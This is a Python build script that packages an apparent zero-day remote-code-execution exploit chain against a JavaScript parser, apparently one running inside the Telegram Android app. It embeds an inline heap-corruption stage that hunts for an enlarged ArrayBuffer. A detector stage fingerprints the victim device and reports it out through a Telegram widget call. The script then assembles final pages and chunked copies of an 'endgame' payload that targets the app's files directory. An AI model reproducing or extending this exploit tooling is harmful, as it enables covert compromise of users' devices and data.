#!/usr/bin/env python3
"""Two-phase universal package; detector + pre-calibrated final (host-only).

The detector and the final share the SAME stage-A text and the SAME total raw
page length; only stage C differs (report vs endgame+marker).  Host experiment
(2026-11-08): a same-length dummy stage C forges exactly like the endgame, so
the detector's measured geometry is the final's geometry class.  The earlier
miss was an extra <script> added by the mock, not the content.

Outputs: detector.html, final_inline.html, final_fallback.html, mocks, chunks
(release/beta), send bodies.  No device/bot/network.
"""
import hashlib, json, os, sys, zlib

HERE = os.path.dirname(os.path.abspath(__file__))
STAG = os.environ.get("STAG_PAYLOAD_DIR", os.path.join(HERE, "..", "..", "vulns", "0day-2-RCE-PARSER-SCOPE", "STAG", "payloads"))
OOB = os.path.join(STAG, "route2")
DEV_ENDGAME = os.path.join(OOB, "endgame-72801.js")
HOST_ENDGAME = os.path.join(OOB, "endgame-host.js")
HEAD = '<!doctype html><body><div id="v">Ok</div>'

# stage A: byte-identical in the detector and the final (parallel v0 logic)
STAGE_A = r''''use strict';var HS=[[2600,2600],[4000,2600]],ATT=0,mark='NOCORR',T0=Date.now();function G(n){var g=new Array(1500),i;for(i=0;i<1500;i++)g[i]=(n?'y':'x').repeat(2048);var o={};g=null;o=null}var RT=[4,0,0,128,5,0,0,0,4,0,0,0,4,0,0,0,4,0,0,0],RJ=[4,0,0,128,5,0,0,0,255,255,0,0,4,0,0,0,4,0,0,0],U=new Uint8Array(479),o;for(o=28;o+40<=479;o+=40)for(var k=0;k<20;k++)U[o+k]=RJ[k],U[o+20+k]=RT[k];var S='"use strict"; globalThis.f = function ([] = eval("[]")) { var q1=0,q2=0,q3=0; return 1.1+2.2+3.3+4.4+5.5+6.6+7.7+8.8+9.9; };';G(0);var V=null,VAB=null,T=null,SP=null;for(ATT=0;ATT<HS.length&&mark==='NOCORR';ATT++){if(ATT>0){G(1)}var NP=HS[ATT][0],NQ=HS[ATT][1],A=new Array(NP+NQ),i;for(i=0;i<NP;i++)A[i]=String.fromCharCode.apply(null,U);var X=String.fromCharCode.apply(null,U);X=null;(0,eval)(S);for(i=NP;i<NP+NQ;i++)A[i]=String.fromCharCode.apply(null,U);var D=new Array(600);for(i=0;i<600;i++)D[i]=new ArrayBuffer(64);T=new Array(600);for(i=0;i<600;i++)T[i]=new ArrayBuffer(64);T[598]=null;try{f()}catch(e){}for(i=0;i<600;i++)if(T[i]!==null&&T[i].byteLength>1024){mark='ABLEN['+i+']='+T[i].byteLength+' ATT='+ATT;break}if(mark==='NOCORR'){A=null;SP=null}else{SP=A}}if(VAB===null)for(var i=0;i<600;i++)if(T[i]!==null&&T[i].byteLength>1024){VAB=T[i];break}if(VAB)try{V=new Uint8Array(VAB);mark+=' VLEN='+V.length}catch(e){mark+=' VERR='+e}globalThis.V=V;globalThis.VAB=VAB;globalThis.T=T;globalThis.SP=SP;globalThis.mark=mark+' T0='+T0;'''

REPORT = r'''!function(){var t=globalThis.V,s='P2',B=[],i,el=0,m=0,n=65535,hd=0,cb=0,att=255,u=function(o){return(t[o]|t[o+1]<<8|t[o+2]<<16|t[o+3]<<24)>>>0},h=function(o){return t[o]|t[o+1]<<8};try{el=Math.min(65535,Date.now()-T0);var q=(typeof mark=='string')?mark.match(/ATT=(\d+)/):null;if(q)att=+q[1];m=(typeof mark=='string'&&mark.indexOf('ABLEN')==0)?1:0;if(m&&t&&t.length==327744)for(i=8;i+24<4096;i+=8)if(u(i)==327744&&u(i+4)==4294967295&&h(i+8)==0){n=i;hd=h(i-8);cb=t[i-6];break}}catch(e){}function P(v,w){for(var j=w-1;j>=0;j--)B.push(v>>8*j&255)}P(2,1);P(1,1);P(1,1);P(m,1);P(att,1);P(599,2);P(n,2);P(hd,2);P(cb,1);P(Math.min(255,Math.round((typeof devicePixelRatio=='number'?devicePixelRatio:1)*10)),1);P(Math.min(4095,(typeof screen!='undefined'&&screen.width)||0),2);P(Math.min(4095,(typeof screen!='undefined'&&screen.height)||0),2);var L=(typeof navigator!='undefined'&&navigator.language)||'',tz=0;try{tz=new Date().getTimezoneOffset()/15}catch(e){}P(L.charCodeAt(0)||63,1);P(L.charCodeAt(1)||63,1);P(Math.min(255,Math.max(0,Math.round(tz)+128)),1);P(1,1);P(el,2);for(i=0;i<B.length;i++)s+=('0'+B[i].toString(16)).slice(-2);globalThis.REP=s;try{var d=document.getElementById('v');if(d)d.textContent='DET '+(m?'HIT':'MISS')+' ATT='+att+' T0='+T0+' R='+s}catch(e){}try{if(typeof TelegramWidget!='undefined'&&TelegramWidget.request){var p=TelegramWidget.request(s);if(p&&p.then)p.then(function(){},function(){})}}catch(e){}}();'''

MARKER = r'''try{var d=document.getElementById('v');if(d)d.textContent='S1 '+(typeof mark!='undefined'?mark:'-')+' | HF '+(typeof MEGA!='undefined'?MEGA:'?')+' T1='+Date.now()}catch(e){}'''

FALLBACK = open(os.path.join(OOB, "out-of-band-72801.html"), encoding="utf-8").read()


def pad_to(s, n):
    d = n - len(s)
    if d < 0:
        raise ValueError("too long: %d > %d" % (len(s), n))
    if d == 0:
        return s
    if d < 4:
        return s + " " * d
    return s + "/*" + "p" * (d - 4) + "*/"


def page(stage_a, stage_c):
    return HEAD + '<script id="stageA">' + stage_a + '</script>' \
        + '<script id="stageC">' + stage_c + '</script>'


def main():
    dev_endgame = open(DEV_ENDGAME, encoding="utf-8").read()
    host_endgame = open(HOST_ENDGAME, encoding="utf-8").read()
    src_path = DEV_ENDGAME
    if "--pkg" in sys.argv and "beta" in sys.argv[sys.argv.index("--pkg") + 1]:
        dev_endgame = dev_endgame.replace("org.telegram.messenger/files",
                                          "org.telegram.messenger.beta/files")
        src_path = os.path.join(HERE, "endgame_beta.js")
        open(src_path, "w").write(dev_endgame)

    fin_c = dev_endgame + MARKER
    L = len(fin_c)
    det_c = pad_to(REPORT, L)
    det = page(STAGE_A, det_c)
    fin = page(STAGE_A, fin_c)
    assert len(det) == len(fin), (len(det), len(fin))

    def wr(name, s):
        open(os.path.join(HERE, name), "w").write(s)
        return {"raw": len(s.encode()),
                "zlib9": len(zlib.compress(s.encode(), 9)),
                "sha256": hashlib.sha256(s.encode()).hexdigest()}
    out = {"detector": wr("detector.html", det),
           "final_inline": wr("final_inline.html", fin),
           "final_fallback": wr("final_fallback.html", FALLBACK),
           "stageC_len": L, "endgame_len": len(dev_endgame)}

    # host mocks: inject TelegramWidget INSIDE the stage-C slot (same total
    # length -- the earlier separate <script> was what broke the geometry).
    mock = ('var TelegramWidget={request:function(d){globalThis.REP=d;'
            'return new Promise(function(r){r(Object.freeze({result:"K"}))})}};')
    def mock_det(source):
        return page(STAGE_A, pad_to(mock + REPORT, L))
    wr("m_det.html", mock_det(det))
    stage_ra = STAGE_A.replace("try{f()}catch(e){}",
                               "(ATT>0?function(){try{f()}catch(e){}}():0);")
    wr("m_det_ra.html", page(stage_ra, pad_to(mock + REPORT, L)))
    stage_miss = STAGE_A.replace("try{f()}catch(e){}", "0;try{}catch(e){}")
    wr("m_det_miss.html", page(stage_miss, pad_to(mock + REPORT, L)))
    # final with the device endgame (host: safe NOANCHOR) and the host endgame
    wr("m_fin_dev.html", fin)
    wr("m_fin_host.html", page(STAGE_A, host_endgame + MARKER))

    # fallback chunks (1,000 B) + manifest
    cdir = "chunks" if "beta" not in "".join(sys.argv) else "chunks_beta"
    os.makedirs(os.path.join(HERE, cdir), exist_ok=True)
    n = (len(dev_endgame) + 999) // 1000
    man = []
    for i in range(n):
        cc = dev_endgame[i * 1000:(i + 1) * 1000]
        open(os.path.join(HERE, cdir, "E%d.txt" % i), "w").write(cc)
        man.append({"i": i, "len": len(cc), "sha256": hashlib.sha256(cc.encode()).hexdigest()})
    json.dump({"n": n, "chunk": 1000, "source": os.path.relpath(src_path, HERE),
               "chunks": man}, open(os.path.join(HERE, cdir, "manifest.json"), "w"), indent=1)

    print(json.dumps(out, indent=1))
    print("chunks:", cdir, n, "endgame", len(dev_endgame))
    if "--check" in sys.argv:
        pins = {"detector.html": "35f8698ead92bd2ed27f7539fcb06196450fb959d2a912f596d8da872d3890f1",
                "final_inline.html": "7aae63e7aed883646e4b41e5acb8b3f46da08a36e1c02c7f32bbfaec98077b33",
                "final_fallback.html": "245f4dc4a2773fedc10647e35b3e95d65409aafb21d7d6f1925ef9aa6a225e1d"}
        ok = all(hashlib.sha256(open(os.path.join(HERE, k), "rb").read()).hexdigest() == v
                 for k, v in pins.items())
        print("RESULT:", "PASS" if ok else "FAIL")


if __name__ == "__main__":
    main()
